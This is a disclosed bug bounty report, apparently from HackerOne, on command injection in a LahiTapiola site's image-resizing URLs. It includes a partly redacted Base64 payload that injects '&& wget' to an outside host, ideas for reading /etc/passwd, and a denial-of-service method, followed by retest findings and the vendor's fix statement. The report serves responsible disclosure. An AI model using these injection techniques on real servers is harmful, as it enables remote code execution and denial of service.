The website fails to validate the user input, allowing arbitrary bash command injection.\n\n**Description:** \nWhen surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg```\n\nThe latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).\n```\u0004\b[\b[\u0007:\u0006fI\"H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg\u0006:\u0006ET[\t:\u0006p:\fconvertI\")-strip -interlace Plane -quality 80%\u0006;\u0006T0[\b;\u0007:\nthumbI\"\t102x\u0006;```.\n\nThe 36 characters from after ' convertI\") ' until after the '80%' can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to \"convert\" (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.\n```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA ```\n\n(Injected command ``` \u0026\u0026 wget http://████████/d.html```).\nThis results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.\n\nThe 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the \"wget\" PoC as this is quite a critical vulnerability, and it shouldn't wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)\n\nPlease, feel free to ask additional questions, or consult about possible solutions.\n\n**Domain:** \ntoimitilat.lahitapiola.fi\n\n## Browsers / Apps Verified In:\nN/A\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1.

Although it is a problematic package with multiple past findings, and should always be kept as up-to-date as possible, the things found on the internet are mostly related to user uploaded FILES processed by the tool ('convert').\n \nThis is not the case here. This report is about a non secure code by the coders who implemented this website; They are most likely calling an external tool using a call to a function to run a Linux Bash command (as the website uses Ruby, most likely in one of the methods mentioned here: https://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby). This is generally a bad method to do things, as it exposes an additional attack surface, but sometimes a coder has no choice. When done, though, this has to be kept as far away as possible from the user viewing the website (behind the scenes, preferably for very specific command only).\n\nIn this aforementioned example, the web server provides parameters to this system call, taken from the user (!).

In fact, the original link still works. (Produces an HTTP GET request to my server).\nA new PoC of the RCE is appended as 'PoC-OldMethodRCEAfterFix.png'\n\nMoreover, I've examined the website with the fix applied to see what was changed. It seems that instead of replacing the old method (some images are still served with it), a new method was ADDED. \nI've examined the new method as well, so to see what would happen if the older one was removed. \nIt appears to be very similar, just more organized (no Non-readable Characters), and injecting parameters is still possible. As a PoC I'm appending a picture fetched with the NEW Method, originally intended to be resized as a small thumbnail, I've Flipped it and Enlarged it using parameter injection. This can be used to overload your server ( i.e. DoS), as resizing images is a resource-heavy process, and as I can inject parameters, I can ask the server to resize an image to huge dimensions with only a single request. \nThe PoC is appended as 'PoC - NewMethodIsStillBad.png'.\n\nA third picture is RCE with the new method, to show that it is still exploitable, even if the old one was to not be used anymore.\n'PoC- New Method RCE.png'\n\nI would recommend saving various copies of the served images, (this can be done using a script), and just serving them statically to the user. Resizing on-the-go using user supplied parameters is a door to problems. \nIf that is absolutely not possible, take the parameters from the user (like Quality, ThumbSize), and validate their authenticity. For example, quality should be a number from 0-100, thumb size should be a number between 50-500 (beware of very large numbers).

I've devoted a few hours to retesting, to see if I could break the mechanism.\nComing up with good and bad things:\n\nThe good:\n- First of all, It seems like the old PoC requests don't work anymore due to a new \"SHA\" mechanism, which supposedly validated the request contents. \n- I have not been able to trigger the RCE exploit anymore, nor bypass the new mechanism.\n\nThe bad:\n-The new mechnaism isn't hermetic: Some requests fetch data in a way that doesn't fully comply with the it. For example, ```https://toimitilat.lahitapiola.fi█████████``` Can be fetched without providing the \"sha\" parameter. I have not yet managed to escalate this into a real threat, but you should notice that this is still an interesting lead for an attacker.\n\n- Secondly, My guess is that the mechanism is still delivering the user supplied parameters into your parsing code. Sending payloads like ```https://toimitilat.lahitapiola.fi████████``` (Which resolve to ```[[\"f\",\"2017/12/14/16_19_42_███lkisivu_lt.jpg\"],[\"p\",\"convert\",\"-strip -interlace Plane -quality 80%\",null],[\"p\",\"thumb\",\"102x\"]```, cause the server to return \"internal server error\". This is due to the \"null\" parameter injected into the request. This differs from an expected behavior: The server does not reject the payload all at once.\n\n-Lastly, and most important, let me repeat as I've already mentioned: This solution is not considered a safe manner to control risky user input among the Information Security community, especially when we know that it may lead to RCE on the server. With enough patience, an attacker may be able to study (through trial an error), ██████████, allowing code execution as before. It might take long, but the attack surface exists, and it is not improbable. I guess this is ultimately your call.\n\nIf you choose to keep the ████ as a major point of security,I suggest to at least make sure that it uses some server-only secret as a seed for the hash, preferably combining ████████for the ultimate result, so it is by no means derivable or guessable from the original text.\n\nIf you have any more questions, don't hesitate to ask!","automated_response":false,"created_at":"2018-02-06T18:16:59.803Z","updated_at":"2018-02-23T10:35:45.104Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2423714,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We are closing this as resolved as we are happy enough with the fix.

The issue arose from a design where the service is using a command line tool to dynamically resize images on the fly. The reporter managed to find a weakness in the way the process was implemented. An attack against this flaw would have lead to a total compromise of the server. \n\n##Fix\nUsing and calling command line tools - as pointed out by the reporter many times - is considered very bad practice. Controlling and sanitizing input to a level that is truly secure is almost impossible. On the other hand, fixing an issue like this is not straightforward due to the fact that the implementation not just contains a technical flaw it also more or less contains an architectural and principal flaw. The reporter assisted in testing the fix which in the end lead to an acceptable although not perfect result.\n\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. Although this service is a part of the LahiTapiola bug bounty program, it is actually a shared platform operated by a third party. LahiTapiola is just one of many corporate users. Fixing the issue was in part coordinated by LahiTapiola to ensure that the width and the breadth of the issue was understood by all affected and involved parties, and that no details were leaked ahead of time as not to put anyone at risk. \n\nThe service does not contain any LahiTapiola customer information nor is it part of the core systems at LahiTapiola. Even if fully owned, the server would not pose a direct threat to other LahiTapiola services - any pivoting to the core internal networks would not have been possible. From a bounty point of view, LahiTapiola always assesses reports from a business perspective.\n\nThe issue is fixed, although not perfectly in any way. Further reports on this matter must provide more actual proof than just repeating the conclusions of this report to be eligible for processing. For any developer reading this report, this can be considered a true learning opportunity.\n\nLahiTapiola wishes to thank the reporter for a valid and valuable report and for patience and assistance during the process of fixing.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}
